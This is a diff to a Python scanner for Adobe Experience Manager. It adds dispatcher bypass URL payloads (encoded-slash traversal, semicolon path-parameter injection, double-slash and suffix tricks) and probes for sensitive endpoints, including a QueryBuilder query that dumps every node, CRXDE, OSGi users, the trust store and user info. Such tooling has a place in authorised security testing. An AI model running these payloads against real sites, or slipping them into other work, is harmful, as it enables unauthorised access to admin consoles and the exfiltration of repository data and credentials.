@@ -6,7 +6,7 @@ Real-time WebSocket-driven scanner with 4-phase pipeline:
   1. Subdomain Enumeration (subfinder)
   2. Alive Host Check (ProjectDiscovery httpx)
   3. AEM Detection (multi-signal fingerprinting)
-  4. Dispatcher Bypass Scan (8+1 bypass techniques, 46 endpoints)
+  4. Dispatcher Bypass Scan (12+1 bypass techniques, 60 endpoints)
 
 API:
   POST /api/scan                — start a scan
@@ -65,11 +65,12 @@ DEFAULT_UA = (
 HEADERS = {"User-Agent": DEFAULT_UA, "Accept": "*/*"}
 
 # ============================================================================
-# AEM ENDPOINTS (46 targets)
+# AEM ENDPOINTS (60 targets)
 # ============================================================================
 AEM_ENDPOINTS: list[tuple[str, str]] = [
     # QueryBuilder / Search
     ("bin/querybuilder.json", "QueryBuilder JSON"),
+    ("bin/querybuilder.json?type=f:NT_BASE&p.limit=-1", "QueryBuilder Dump All"),
     ("bin/querybuilder.json.servlet", "QueryBuilder Servlet"),
     ("bin/querybuilder.feed.servlet", "QueryBuilder Feed"),
     ("bin/wcm/search/gql.servlet.json", "GQL Search"),
@@ -79,6 +80,7 @@ AEM_ENDPOINTS: list[tuple[str, str]] = [
     ("crx/packmgr/service.jsp?cmd=ls", "CRX PackMgr List Pkgs"),
     ("crx/packmgr/index.jsp", "CRX PackMgr UI"),
     ("crx/de/index.jsp", "CRXDE Lite"),
+    ("crx/de/service.jsp", "CRXDE Service"),
     ("crx/explorer/browser/index.jsp", "CRX Browser"),
     ("crx/server/crx.default/jcr:root/.1.json", "JCR Root JSON"),
     # OSGi / System Console
@@ -87,6 +89,8 @@ AEM_ENDPOINTS: list[tuple[str, str]] = [
     ("system/console/configMgr", "OSGi ConfigMgr"),
     ("system/console/jmx", "JMX Console"),
     ("system/console/status-productinfo.txt", "Product Info"),
+    ("system/console/users", "OSGi Users"),
+    ("system/console/licenses", "OSGi Licenses"),
     ("system/health", "Health Check"),
     # Content / JCR
     ("content.json", "Content Root JSON"),
@@ -96,6 +100,7 @@ AEM_ENDPOINTS: list[tuple[str, str]] = [
     ("content/dam.1.json", "DAM Depth-1 JSON"),
     ("content/dam.infinity.json", "DAM Infinity JSON"),
     ("content/usergenerated.json", "User Generated Content"),
+    ("content/usergenerated/content.json", "User Generated Content JSON"),
     # Admin / UI Panels
     ("libs/granite/security/content/useradmin.html", "User Admin"),
     ("libs/granite/security/content/admin.html", "Granite Admin"),
@@ -106,6 +111,8 @@ AEM_ENDPOINTS: list[tuple[str, str]] = [
     ("libs/cq/core/content/welcome.html", "CQ Welcome"),
     ("libs/dam/gui/content/assets.html", "DAM Assets UI"),
     ("libs/cq/gui/content/dumplibs.html", "ClientLibs Dump"),
+    ("libs/cq/tagging/gui/content/tagging.html", "Tag Manager"),
+    ("libs/cq/workflow/content/console.html", "Workflow Console"),
     # Config / Replication
     ("etc/packages.json", "Packages JSON"),
     ("etc/reports/diskusage.html", "Disk Usage"),
@@ -113,8 +120,14 @@ AEM_ENDPOINTS: list[tuple[str, str]] = [
     ("etc/replication/agents.publish.html", "Replication Publish"),
     ("etc/replication.html", "Replication Page"),
     ("etc/cloudservices.html", "Cloud Services"),
+    ("etc/designs.json", "Designs JSON"),
     # CSRF / Token Leaks
     ("libs/granite/csrf/token.json", "CSRF Token Leak"),
+    # Trust Store / Security
+    ("libs/granite/security/truststore.json", "Trust Store JSON"),
+    ("libs/cq/security/userinfo.json", "User Info JSON"),
+    # Feeds / Sling
+    ("bin/feed.json", "Sling Feed JSON"),
     # Misc
     ("admin", "AEM Admin"),
     ("start", "AEM Start"),
@@ -122,6 +135,7 @@ AEM_ENDPOINTS: list[tuple[str, str]] = [
     ("apps.json", "Apps JSON"),
     ("var/classes.json", "Var Classes JSON"),
     ("bin/wcm/domainmanager", "Domain Manager"),
+    ("bin/acs-commons/audit-log-search.html", "ACS Audit Log"),
 ]
 
 # ============================================================================
@@ -174,6 +188,19 @@ AEM_SIGNATURES: dict[str, list[str]] = {
     "Domain Manager": ["DomainManager", "domain manager"],
     "AEM Admin": ["Adobe Experience Manager", "Welcome to AEM"],
     "AEM Start": ["Adobe Experience Manager", "AEM"],
+    # New endpoints
+    "QueryBuilder Dump All": ['"hits"', '"success"', '"results"', '"jcr:primaryType"'],
+    "CRXDE Service": ["crx:", "jcr:", "crxde", "service.jsp"],
+    "OSGi Users": ["users", "principal", "admin", "apache"],
+    "OSGi Licenses": ["license", "Apache", "felix"],
+    "User Generated Content JSON": ['"jcr:primaryType"', "usergenerated"],
+    "Tag Manager": ["tagging", "cq:Tag", "tagmanager"],
+    "Workflow Console": ["workflow", "Workflow", "models"],
+    "Designs JSON": ['"jcr:primaryType"', '"designs"', '"cq:Page"'],
+    "Trust Store JSON": ['"truststore"', '"aliases"', '"subject"'],
+    "User Info JSON": ['"userId"', '"name"', '"home"', '"path"'],
+    "Sling Feed JSON": ['"feed"', '"entries"', '"sling"'],
+    "ACS Audit Log": ["audit", "ACS", "acs-commons"],
 }
 
 # ============================================================================
@@ -284,11 +311,15 @@ BYPASS_TAGS: list[str] = [
     "hybrid",
     "dynmedia",
     "nocanon-3dot",
+    "double-slash",
+    "encoded-slash",
+    "semi-traverse",
+    "suffix-bypass",
 ]
 
 
 def build_bypass_paths(ep_path: str) -> list[tuple[str, str]]:
-    """Build all 8 bypass URL variants for a given endpoint path."""
+    """Build all 12 bypass URL variants for a given endpoint path."""
     if "?" in ep_path:
         base, qs = ep_path.split("?", 1)
         qs = "?" + qs
@@ -296,25 +327,37 @@ def build_bypass_paths(ep_path: str) -> list[tuple[str, str]]:
         base, qs = ep_path, ""
 
     return [
-        ("nocanon", f"/graphql/execute.json/..%2f../{base}{qs}"),
-        ("nocanon-upper", f"/graphql/execute.json/..%2F../{base}{qs}"),
-        ("nocanon-2slash", f"//graphql/execute.json/..%2f../{base}{qs}"),
-        ("nocanon-2slash-up", f"//graphql/execute.json/..%2F../{base}{qs}"),
-        ("path-param", f"/{base};a.css{qs}"),
-        ("hybrid", f"/{base};x=graphql/execute.json{qs}"),
-        ("dynmedia", f"/adobe/dynamicmedia/deliver/..;/..;/..;/{base}{qs}"),
-        ("nocanon-3dot", f"/graphql/execute.json/..%2f..%2f..%2f{base}{qs}"),
+        # Technique 1-4: AllowEncodedSlashes / nocanon traversal
+        ("nocanon",          f"/graphql/execute.json/..%2f../{base}{qs}"),
+        ("nocanon-upper",    f"/graphql/execute.json/..%2F../{base}{qs}"),
+        ("nocanon-2slash",   f"//graphql/execute.json/..%2f../{base}{qs}"),
+        ("nocanon-2slash-up",f"//graphql/execute.json/..%2F../{base}{qs}"),
+        # Technique 5-6: Semicolon path-parameter injection
+        ("path-param",       f"/{base};a.css{qs}"),
+        ("hybrid",           f"/{base};x=graphql/execute.json{qs}"),
+        # Technique 7: DynamicMedia path traversal
+        ("dynmedia",         f"/adobe/dynamicmedia/deliver/..;/..;/..;/{base}{qs}"),
+        # Technique 8: Triple-dot encoded traversal
+        ("nocanon-3dot",     f"/graphql/execute.json/..%2f..%2f..%2f{base}{qs}"),
+        # Technique 9: Double-slash direct (dispatcher rule bypass)
+        ("double-slash",     f"//{base}{qs}"),
+        # Technique 10: URL-encoded slash prefix
+        ("encoded-slash",    f"/%2f{base}{qs}"),
+        # Technique 11: Semicolon traversal via content path
+        ("semi-traverse",    f"/content/..;/{base}{qs}"),
+        # Technique 12: Suffix/selector bypass via .html/suffix
+        ("suffix-bypass",    f"/{base}.css/a.html{qs}" if not qs else f"/{base}.css{qs}"),
     ]
 
 
 def build_ext_json_path(ep_path: str) -> tuple[str, str] | None:
-    """Build the .ext.json selector bypass variant (technique #9)."""
+    """Build the .ext.json selector bypass variant (technique #13)."""
     if "?" in ep_path:
         base, qs = ep_path.split("?", 1)
         qs = "?" + qs
     else:
         base, qs = ep_path, ""
-    # Only applicable to paths without an existing .json extension
+    # Applicable to paths with extensions that can be rewritten
     if base.endswith(".json") or base.endswith(".html") or base.endswith(".jsp"):
         root = base.rsplit(".", 1)[0]
         return ("ext-json", f"/{root}.ext.json{qs}")
